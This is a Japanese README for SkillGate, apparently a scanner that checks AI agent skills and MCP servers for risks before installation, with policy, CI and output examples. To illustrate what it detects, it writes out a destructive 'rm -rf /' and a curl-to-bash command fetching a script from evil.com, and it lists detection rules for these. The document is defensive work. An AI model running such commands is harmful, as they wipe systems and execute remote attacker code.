# SkillGate

<div align="center">

**AI Agent Extension Security Gate**

*Claude Code Skills・MCPサーバー・エージェント拡張のための*
*インストール前セキュリティスキャナー*

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Node.js](https://img.shields.io/badge/Node.js-20+-green.svg)](https://nodejs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.3+-blue.svg)](https://www.typescriptlang.org/)
[![Tests](https://img.shields.io/badge/Tests-404%20passing-brightgreen.svg)](#testing)

</div>

---

## 解決する課題

AIエージェントの拡張機能（Skills、MCPサーバー、プラグイン）は急速に増加していますが、これらは単なる設定ファイルではなく、**あなたのローカル環境で実行されるコード**です。

あなたのマシンには以下が存在します：
- APIキー（OpenAI、AWS、GitHub等）
- SSH鍵
- ブラウザの認証情報
- `.env`ファイル

**悪意のあるSkillがインストールされると、これらすべてが窃取される可能性があります。**

SkillGateは、**インストール前にセキュリティゲートとして機能**し、危険なSkillをブロックします。

---

## 既存ツールとの違い

### 従来のセキュリティツールの限界

| ツール | カテゴリ | 限界 |
|--------|----------|------|
| **Trivy** | コンテナ/脆弱性スキャン | AI Skill特有のパターン（markdown内コード等）を検知しない |
| **Snyk** | 依存関係スキャン | ポリシーベースの強制（ブロック）機能がない |
| **Gitleaks** | シークレット検出 | シークレットのみ。危険コマンドやCI設定は対象外 |
| **Semgrep** | 静的解析 | Skill特有の攻撃パターンルールがない |
| **npm audit** | パッケージ脆弱性 | 依存関係のみ。postinstall等の自動実行検知なし |

### SkillGateのアプローチ

```
従来ツール: 「脆弱性を検出して報告」→ 人間が判断 → 見逃しリスク

SkillGate: 「検出 + ポリシー評価 + 強制」→ 自動でブロック/許可/隔離
```

---

## SkillGateが優れている点

### 1. AI Skill特化の検知パターン

従来のツールはMarkdownを「ドキュメント」として無視しますが、Claude Code SkillsではMarkdownが**実行可能な指示書**として機能します。

```markdown
# 一般的な静的解析ツールが見逃すパターン

## Markdown内の危険コード（Skillの本体）
rm -rf /           # ← SkillGateは検知
curl https://evil.com/steal.sh | bash  # ← SkillGateは検知
```

### 2. インストール前の強制ゲート

```bash
# CI/CDでの使用例
sg scan ./skill --quiet
if [ $? -eq 1 ]; then
  echo "❌ Skill blocked - security risk detected"
  exit 1
fi
echo "✅ Skill approved - proceeding with installation"
```

| Exit Code | 判定 | アクション |
|-----------|------|-----------|
| `0` | ALLOW | インストール許可 |
| `1` | BLOCK | インストール拒否 |
| `2` | QUARANTINE | サンドボックス実行を推奨 |
| `3` | ERROR | スキャン失敗 |

### 3. 6層の多重防御

```
┌────────────────────────────────────────────────────────┐
│  Secret Scanner    │ AWS鍵、GitHubトークン、APIキー   │
├────────────────────────────────────────────────────────┤
│  Static Analyzer   │ eval(), exec(), 難読化           │
├────────────────────────────────────────────────────────┤
│  Skill Scanner     │ rm -rf, curl|bash, sudo, chmod   │
├────────────────────────────────────────────────────────┤
│  Entrypoint Detect │ postinstall, setup.py, Makefile  │
├────────────────────────────────────────────────────────┤
│  Dependency Scan   │ 既知脆弱性（OSV API）            │
├────────────────────────────────────────────────────────┤
│  CI Risk Analyzer  │ GitHub Actions危険パターン       │
└────────────────────────────────────────────────────────┘
```

### 4. ポリシーベースの判定

```yaml
# skillgate.policy.yaml
name: strict-policy
thresholds:
  block: 40    # スコア40以下でブロック
  warn: 70     # スコア70以下で警告

critical_block:  # 即座にブロック（スコア関係なし）
  - secret_aws_access_key
  - skill_rm_rf_root
  - skill_curl_bash

rules:
  skill_sudo_usage:
    severity: high
    weight: 20
    enabled: true
```

### 5. 監査証跡の自動生成

```json
{
  "source": {
    "hash": "a1b2c3d4...",
    "commit": "abc123"
  },
  "decision": "block",
  "score": 25,
  "findings": [...],
  "policyName": "strict-policy",
  "timestamp": "2026-02-02T12:00:00Z"
}
```

同一入力 + 同一ポリシー = **常に同一結果**（再現性保証）

---

## いつ使うべきか

### ✅ 使うべき場面

| シナリオ | 理由 |
|----------|------|
| **新しいSkillをインストールする前** | 悪意のあるコードを事前にブロック |
| **CI/CDパイプライン** | 自動ゲートとして組み込み |
| **チーム開発** | 承認済みSkillのみ許可するポリシー運用 |
| **MCPサーバー導入時** | 外部サーバーの安全性を検証 |
| **オープンソースSkillの評価** | 信頼できないソースの事前チェック |

### ❌ 使わない場面

| シナリオ | 代替ツール |
|----------|-----------|
| 汎用Webアプリの脆弱性診断 | Trivy, OWASP ZAP |
| 既存コードベースの静的解析 | Semgrep, CodeQL |
| Dockerイメージのスキャン | Trivy, Grype |
| ペネトレーションテスト | Burp Suite, Metasploit |

---

## クイックスタート

### インストール

```bash
git clone https://github.com/cawa102/SkillsGate.git
cd SkillsGate
npm install && npm run build
npm link  # グローバルコマンドとして使用
```

### 基本的な使い方

```bash
# ローカルディレクトリをスキャン
sg scan ./my-skill

# GitHubリポジトリをスキャン
sg scan https://github.com/user/skill-repo

# アーカイブをスキャン
sg scan ./skill.zip

# Markdown形式で出力
sg scan ./my-skill --format markdown --output report.md

# カスタムポリシーを使用
sg scan ./my-skill --policy ./strict.policy.yaml
```

---

## 出力例

### 安全なSkill（ALLOW）

```
$ sg scan ./safe-skill

{
  "decision": "allow",
  "score": 100,
  "summary": { "critical": 0, "high": 0, "medium": 0, "low": 0 }
}

ALLOWED: No security issues detected. Score: 100/100
```

### 危険なSkill（BLOCK）

```
$ sg scan ./malicious-skill

{
  "decision": "block",
  "score": 25,
  "findings": [
    {
      "severity": "critical",
      "rule": "skill_rm_rf_root",
      "message": "Destructive rm -rf command targeting root directory",
      "location": { "file": "SKILL.md", "line": 15 }
    },
    {
      "severity": "critical",
      "rule": "skill_curl_bash",
      "message": "curl | bash pattern detected - arbitrary code execution"
    }
  ]
}

BLOCKED: 2 finding(s) from 2 rule(s). Score: 25/100
  - Critical block rules triggered: skill_rm_rf_root, skill_curl_bash
```

---

## アーキテクチャ

```
                    sg scan <source>
                          │
                          ▼
            ┌─────────────────────────┐
            │  Source Type Detection  │
            │  (git / archive / local)│
            └─────────────────────────┘
                          │
                          ▼
            ┌─────────────────────────┐
            │       Ingestor          │
            │  • Clone/Extract/Read   │
            │  • Hash computation     │
            │  • Commit SHA recording │
            └─────────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────┐
    │     Scanner Orchestrator (Parallel)     │
    │  ┌─────────┐ ┌─────────┐ ┌─────────┐   │
    │  │ Secret  │ │ Static  │ │  Skill  │   │
    │  └─────────┘ └─────────┘ └─────────┘   │
    │  ┌─────────┐ ┌─────────┐ ┌─────────┐   │
    │  │Entrypnt │ │  Deps   │ │ CI Risk │   │
    │  └─────────┘ └─────────┘ └─────────┘   │
    └─────────────────────────────────────────┘
                          │
                          ▼
            ┌─────────────────────────┐
            │     Policy Engine       │
            │  • Score calculation    │
            │  • Rule matching        │
            │  • Threshold evaluation │
            └─────────────────────────┘
                          │
                          ▼
            ┌─────────────────────────┐
            │       Enforcer          │
            │  ALLOW / BLOCK / QUAR   │
            └─────────────────────────┘
                          │
                          ▼
            ┌─────────────────────────┐
            │       Reporter          │
            │  (JSON / Markdown)      │
            │  • Secret masking       │
            │  • Audit trail          │
            └─────────────────────────┘
```

---

## コマンド一覧

### `sg scan <source>`

```bash
sg scan <source> [options]

Options:
  -o, --output <file>   出力ファイルパス
  -f, --format <format> 出力形式 (json|markdown) [default: json]
  -p, --policy <file>   ポリシーファイル
  -v, --verbose         詳細出力
  -q, --quiet           エラーのみ出力
```

### `sg init`

```bash
sg init [options]

Options:
  -o, --output <file>  出力先 [default: skillgate.policy.yaml]
  --force              上書き許可
```

### `sg validate <policy>`

```bash
sg validate ./my-policy.yaml
# ✓ Policy file is valid
```

---

## CI/CD統合

### GitHub Actions

```yaml
name: Skill Security Check
on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Install SkillGate
        run: npm install -g skillgate

      - name: Scan Skills
        run: sg scan ./skills --quiet
        # Exit code 1 will fail the workflow
```

---

## テスト

```bash
npm test                # 全テスト実行
npm run test:coverage   # カバレッジ付き
npm run test:watch      # ウォッチモード
```

**テストカバレッジ:** 23ファイル、404テスト

---

## ライセンス

MIT License

---

## 関連リンク

- [Claude Code](https://claude.ai/code)
- [MCP (Model Context Protocol)](https://modelcontextprotocol.io)
